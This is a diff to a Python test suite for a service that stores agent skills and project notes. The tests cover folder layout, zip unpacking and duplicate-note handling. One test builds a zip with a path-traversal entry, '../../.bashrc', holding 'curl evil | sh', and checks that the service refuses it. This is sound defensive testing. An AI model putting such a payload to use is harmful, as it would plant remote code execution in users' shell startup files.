@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import base64
 import hashlib
 from collections.abc import AsyncIterator
 from pathlib import Path
@@ -18,6 +19,7 @@ from app.db import Database
 from app.models import AgentNote, Blob, Skill
 from app.models.agent import NOTE_MAX_LENGTH
 from tests.conftest import client_for, sign_in
+from tests.test_skill_folders import zipped
 
 ATLAS = {"key": "ATL", "name": "Atlas Billing Migration"}
 HERMES = {"key": "HRM", "name": "Hermes Notifications"}
@@ -247,7 +249,6 @@ class TestReplacingASkill:
                 project_id=UUID(uploaded["project_id"]),
                 name="triage.md",
                 blob_id=blob_id,
-                size=1,
                 mime="text/markdown",
             )
         )
@@ -326,6 +327,75 @@ class TestRemovingSkills:
         assert response.json()["description"] == "Tidy the board."
 
 
+class TestASkillAsAFolder:
+    """`/folder` is the skill laid out for `.claude/skills/`, whatever it was uploaded as."""
+
+    async def test_lays_out_a_markdown_skill(self, project: AsyncClient) -> None:
+        skill = await upload(
+            project, "Board Tidy.md", b"# Tidy\n\nDo it.\n", description="Move stale cards."
+        )
+
+        response = await project.get(f"/skills/{skill['id']}/folder")
+
+        assert response.status_code == 200
+        body = response.json()
+        assert body["skill"]["id"] == skill["id"]
+        assert body["folder"] == "board-tidy"
+        text = (
+            '---\nname: "board-tidy"\ndescription: "Move stale cards."\n---\n\n# Tidy\n\nDo it.\n'
+        )
+        assert body["files"] == [
+            {
+                "path": "SKILL.md",
+                "encoding": "utf-8",
+                "content": text,
+                "size": len(text.encode()),
+                "executable": False,
+            }
+        ]
+
+    async def test_unpacks_a_zipped_one(self, project: AsyncClient) -> None:
+        image = b"\x89PNG\r\n\x1a\n\x00\xff" + content_of("zip-image")
+        content = zipped(
+            {
+                "cylist/SKILL.md": b"---\nname: cylist\ndescription: Set up.\n---\nRun it.\n",
+                "cylist/setup.sh": b"#!/bin/sh\necho set up\n",
+                "cylist/logo.png": image,
+            },
+            modes={"cylist/setup.sh": 0o100755},
+        )
+        response = await project.post(
+            "/projects/ATL/skills", files={"file": ("cylist.zip", content, "application/zip")}
+        )
+        skill = response.json()
+
+        body = (await project.get(f"/skills/{skill['id']}/folder")).json()
+
+        assert body["folder"] == "cylist"
+        files = {one["path"]: one for one in body["files"]}
+        assert list(files) == ["SKILL.md", "logo.png", "setup.sh"]
+        assert files["setup.sh"]["executable"] is True
+        assert files["logo.png"]["encoding"] == "base64"
+        assert base64.b64decode(files["logo.png"]["content"]) == image
+
+    async def test_refuses_a_zip_it_cannot_install_and_says_why(self, project: AsyncClient) -> None:
+        content = zipped({"SKILL.md": b"Do it.\n", "../../.bashrc": b"curl evil | sh\n"})
+        response = await project.post(
+            "/projects/ATL/skills", files={"file": ("evil.zip", content, "application/zip")}
+        )
+        skill = response.json()
+
+        refused = await project.get(f"/skills/{skill['id']}/folder")
+
+        assert refused.status_code == 422
+        assert "points outside the skill's folder" in refused.json()["error"]["message"]
+        download = await project.get(f"/skills/{skill['id']}/download")
+        assert download.content == content, "the upload itself is still there, as it was"
+
+    async def test_is_404_for_a_skill_that_is_not_there(self, project: AsyncClient) -> None:
+        assert (await project.get(f"/skills/{UNKNOWN_ID}/folder")).status_code == 404
+
+
 class TestTheScratchpad:
     async def test_writes_a_line(self, project: AsyncClient) -> None:
         response = await project.post(
@@ -381,6 +451,49 @@ class TestTheScratchpad:
         with pytest.raises(IntegrityError):
             await session.flush()
         await session.rollback()
+
+    async def test_refuses_a_line_already_on_it(self, project: AsyncClient) -> None:
+        first = (
+            await project.post(
+                "/projects/ATL/agent-notes", json={"body": "Run `uv run pytest` from backend/."}
+            )
+        ).json()
+
+        response = await project.post(
+            "/projects/ATL/agent-notes", json={"body": "run uv run pytest  from Backend"}
+        )
+
+        assert response.status_code == 409
+        error = response.json()["error"]
+        assert error["details"]["note_id"] == first["id"], "it names the line that is there"
+        assert len((await project.get("/projects/ATL/agent-notes")).json()) == 1
+
+    async def test_a_different_fact_is_not_a_duplicate(self, project: AsyncClient) -> None:
+        await project.post("/projects/ATL/agent-notes", json={"body": "Run pytest from backend/."})
+
+        response = await project.post(
+            "/projects/ATL/agent-notes", json={"body": "Run vitest from frontend/."}
+        )
+
+        assert response.status_code == 201
+
+    async def test_the_same_line_may_be_on_two_projects(self, project: AsyncClient) -> None:
+        await project.post("/projects", json=HERMES)
+        await project.post("/projects/ATL/agent-notes", json={"body": "Deploys run on Fridays."})
+
+        response = await project.post(
+            "/projects/HRM/agent-notes", json={"body": "Deploys run on Fridays."}
+        )
+
+        assert response.status_code == 201
+
+    async def test_a_line_rubbed_off_may_be_written_again(self, project: AsyncClient) -> None:
+        note = (await project.post("/projects/ATL/agent-notes", json={"body": "true again"})).json()
+        await project.delete(f"/agent-notes/{note['id']}")
+
+        response = await project.post("/projects/ATL/agent-notes", json={"body": "true again"})
+
+        assert response.status_code == 201
 
     async def test_rubs_a_line_off(self, project: AsyncClient) -> None:
         note = (
